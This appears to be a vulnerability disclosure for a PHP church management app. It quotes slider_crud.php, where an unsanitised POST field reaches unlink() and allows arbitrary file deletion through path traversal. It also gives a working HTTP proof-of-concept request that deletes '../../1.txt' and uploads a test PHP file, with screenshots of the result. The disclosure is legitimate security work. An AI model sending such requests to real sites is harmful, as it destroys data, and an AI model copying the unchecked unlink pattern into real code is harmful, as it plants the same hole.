### Vulnerability file address

In line 55 of `church/admin/app/slider_crud.php`, `@unlink("../../assets/images/" . $_POST['old_photo_img']);`,` $_POST['old_photo_img']` parameters have not been restricted, which causes any file to be deleted

```php
<?php 
session_start();
 include '../../assets/constant/config.php';
 
 try {
		$conn = new PDO("mysql:host=$servername;dbname=$dbname", $username, $password);
		$conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);


		if (isset($_POST['submit'])) 
		{
		$uploadDir = '../../assets/images/';
        if ($_FILES['photo']['tmp_name'] != '') {
            $filepath = "../../assets/images/" . $_FILES["photo"]["name"];
            $originalName = basename($_FILES['photo']['name']);
            $extension = pathinfo($originalName, PATHINFO_EXTENSION);

            // Generate a new unique file name
            $newName = uniqid() . '.' . $extension;

            // Set the path to the new file location
            $newFilePath = $uploadDir . $newName;

            // Upload the file to the server
            if (move_uploaded_file($_FILES['photo']['tmp_name'], $newFilePath)) {
                $img = $newName;
            } else {
                echo 'There was an error uploading the file.';
            }
        }

			$stmt = $conn->prepare("INSERT INTO `slider`(`photo`,`heading`,`heading1`) VALUES (?,?,?)");

			$stmt->execute([$img,$_POST['heading'],$_POST['heading1']]);

			$_SESSION['success']="success";
		

			header("location:../manage_slider.php" ); 

		}
	
	

		if (isset($_POST['update'])) {

    if ($_FILES['photo']['tmp_name'] != '') {
        $file_extension = pathinfo($_FILES["photo"]["name"], PATHINFO_EXTENSION);
        $new_filename = uniqid() . '.' . $file_extension;
        $filepath = "../../assets/images/" . $new_filename;

        if (move_uploaded_file($_FILES["photo"]["tmp_name"], $filepath)) {
            $img = $new_filename;

            @unlink("../../assets/images/" . $_POST['old_photo_img']);
        }
    } else {
        $img = $_POST['old_photo_img'];
    }
```

### POC

```http
POST /church/admin/app/slider_crud.php HTTP/1.1
Host: www.church.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: PHPSESSID=kecn6qqrggjnvlpgliqeq951j0
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Length: 399

------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="update"

1
------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="old_photo_img"

../../1.txt
------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="photo";filename="6666.php"

<?php echo "this is webshell test"; ?>
------WebKitFormBoundaryTZGvWJmfBtMK9O8p--

```

### Attack results pictures

First, we create a `1.txt` file in the `church/` directory

![image-20250221164146551](https://raw.githubusercontent.com/nixuchuan/imgs/main/202502211641596.png)



Then we execute the above poc to attack

![image-20250221164210404](https://raw.githubusercontent.com/nixuchuan/imgs/main/202502211642451.png)



Files are deleted after the attack is successful

![image-20250221164224564](https://raw.githubusercontent.com/nixuchuan/imgs/main/202502211642602.png)